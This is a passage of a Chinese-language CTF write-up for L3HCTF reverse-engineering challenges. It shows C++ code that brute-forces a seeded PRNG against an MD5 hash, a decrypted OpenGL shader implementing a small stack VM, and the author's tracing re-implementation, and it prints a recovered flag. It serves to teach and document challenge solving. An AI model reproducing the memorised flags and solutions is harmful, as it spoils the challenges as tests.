class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dword_7FF72F33B040 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">sub_7FF72F3314D5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    v1 = (((dword_7FF72F33B040 &lt;&lt; <span class="number">13</span>) ^ (<span class="type">unsigned</span> <span class="type">int</span>)dword_7FF72F33B040) &gt;&gt; <span class="number">17</span>)</span><br><span class="line">        ^ (dword_7FF72F33B040 &lt;&lt; <span class="number">13</span>)</span><br><span class="line">        ^ dword_7FF72F33B040;</span><br><span class="line">    dword_7FF72F33B040 = (<span class="number">32</span> * v1) ^ v1;</span><br><span class="line">    <span class="keyword">return</span> dword_7FF72F33B040 &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (DWORD c = <span class="number">1751990400</span>; c &lt;= <span class="number">1752052051</span>; c++)</span><br><span class="line">    &#123;</span><br><span class="line">        dword_7FF72F33B040 = c;</span><br><span class="line">        DWORD v45, v48, v49, v50, v51;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)<span class="built_in">sub_7FF72F3314D5</span>(); ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            v51 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">            v50 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">            v49 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">            v48 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        v45 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> Buf[<span class="number">1024</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf</span>(Buf, <span class="string">&quot;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=%d&amp;r=%d&amp;a=%d&amp;b=%d&amp;x=%d&amp;y=%d&quot;</span>, c, v45, v51, v50, v49, v48);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> md5Txt = <span class="built_in">MD5</span>(Buf).<span class="built_in">toStr</span>();</span><br><span class="line">        <span class="keyword">if</span> (md5Txt == <span class="string">&quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;time:%X\n&quot;</span>, c);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, Buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">time:686D4FA5</span></span><br><span class="line"><span class="comment">salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=1751994277&amp;r=101356418&amp;a=1388848462&amp;b=441975230&amp;x=1469980073&amp;y=290308156</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>SHA1(query) &#x3D; 5cbbe37231ca99bd009f7eb67f49a98caae2bb0f</p><p>L3HCTF{5cbbe37231ca99bd009f7eb67f49a98caae2bb0f}</p><h2 id="终焉之门"><a href="#终焉之门" class="headerlink" title="终焉之门"></a>终焉之门</h2><p>OpenGL程序，核心代码在着色器代码里面，断点此处就可以得到解密后的着色器代码，</p><p><img src="/2025/07/14/L3HCTF/image-9.png" alt="alt text"></p><p>着色器代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#version 430 core</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">layout</span>(local_size_x = <span class="number">1</span>, local_size_y = <span class="number">1</span>, local_size_z = <span class="number">1</span>) in;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">0</span>) buffer OpCodes  &#123; <span class="type">int</span> opcodes[]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">2</span>) buffer CoConsts &#123; <span class="type">int</span> co_consts[]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">3</span>) buffer Cipher   &#123; <span class="type">int</span> cipher[<span class="number">16</span>]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">4</span>) buffer Stack    &#123; <span class="type">int</span> stack_data[<span class="number">256</span>]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">5</span>) buffer Out      &#123; <span class="type">int</span> verdict;         &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxInstructionCount = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (gl_GlobalInvocationID.x &gt; <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    uint ip = <span class="number">0u</span>;</span><br><span class="line">    <span class="type">int</span> sp = <span class="number">0</span>;</span><br><span class="line">    verdict = <span class="number">-233</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (ip &lt; <span class="built_in">uint</span>(MaxInstructionCount))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> opcode = opcodes[<span class="built_in">int</span>(ip)];</span><br><span class="line">        <span class="type">int</span> arg    = opcodes[<span class="built_in">int</span>(ip)<span class="number">+1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (opcode)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                stack_data[sp++] = co_consts[arg];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a + b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a - b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a ^ b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = <span class="built_in">int</span>(a == b);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">bool</span> ok = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack_data[i] != (cipher[i] - <span class="number">20</span>))</span><br><span class="line">                    &#123; </span><br><span class="line">                        ok = <span class="literal">false</span>; </span><br><span class="line">                        <span class="keyword">break</span>; </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                verdict = ok ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> c = stack_data[--sp];</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="number">0</span>) ip = <span class="built_in">uint</span>(arg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                verdict = <span class="number">500</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ip+=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    verdict = <span class="number">501</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现是一个简易VM，通过开头几个参数的binding值，02345可以在IDA找到对应的变量，然后在上面代码就可以找到对应的资源数据。</p><p><img src="/2025/07/14/L3HCTF/image-10.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-11.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-12.png" alt="alt text"></p><p>这边就是判断输入flag长度、格式，然后将括号内每两个字节进行unhex存入co_consts前十六个位置。</p><p>如：”1f3d22” -&gt; {0x1f,0x3d,0x22}</p><p><img src="/2025/07/14/L3HCTF/image-13.png" alt="alt text"></p><p>这边采用同构VM代码，通过输出流程来研究加密。</p><p>同构代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> opcodes[<span class="number">168</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000011</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000012</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000013</span>,</span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000014</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000015</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000016</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000017</span>,</span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000018</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000019</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001B</span>,</span><br><span class="line">    <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000001C</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000D</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000002</span>, <span class="number">0x00000011</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000012</span>, <span class="number">0x00000054</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> cipher[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x000000F3</span>, <span class="number">0x00000082</span>, <span class="number">0x00000006</span>, <span class="number">0x000001FD</span>, <span class="number">0x00000150</span>, <span class="number">0x00000038</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000DE</span>,</span><br><span class="line">    <span class="number">0x0000015A</span>, <span class="number">0x00000197</span>, <span class="number">0x0000009C</span>, <span class="number">0x000001D7</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000028</span>, <span class="number">0x00000146</span>, <span class="number">0x00000097</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> co_consts[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000000B0</span>, <span class="number">0x000000C8</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000086</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000BF</span>,</span><br><span class="line">    <span class="number">0x000000C9</span>, <span class="number">0x00000064</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000EF</span>, <span class="number">0x00000087</span>, <span class="number">0x00000000</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> stack_data[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxInstructionCount = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> ip = <span class="number">0u</span>;</span><br><span class="line">    <span class="type">int</span> sp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> verdict = <span class="number">-233</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (ip &lt; MaxInstructionCount)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> opcode = opcodes[<span class="built_in">int</span>(ip)];</span><br><span class="line">        <span class="type">int</span> arg = opcodes[<span class="built_in">int</span>(ip) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (opcode)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = co_consts[%d];\n&quot;</span>, sp, arg);</span><br><span class="line">            stack_data[sp++] = co_consts[arg];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]+stack_data[%d];\n&quot;</span>, sp, sp, sp + <span class="number">1</span>);</span><br><span class="line">            stack_data[sp++] = a + b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]-stack_data[%d];\n&quot;</span>, sp, sp + <span class="number">1</span>, sp);</span><br><span class="line">            stack_data[sp++] = a - b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]^stack_data[%d];\n&quot;</span>, sp, sp, sp<span class="number">+1</span>,a^b);</span><br><span class="line">            stack_data[sp++] = a ^ b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]==stack_data[%d];\n&quot;</span>, sp, sp, sp<span class="number">+1</span>);</span><br><span class="line">            stack_data[sp++] = <span class="built_in">int</span>(a == b);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Compare...\n&quot;</span>);</span><br><span class="line">            <span class="type">bool</span> ok = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (stack_data[i] != (cipher[i] - <span class="number">20</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            verdict = ok ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> c = stack_data[--sp];</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="number">0</span>) ip = arg;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            verdict = <span class="number">500</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ip += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    verdict = <span class="number">501</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 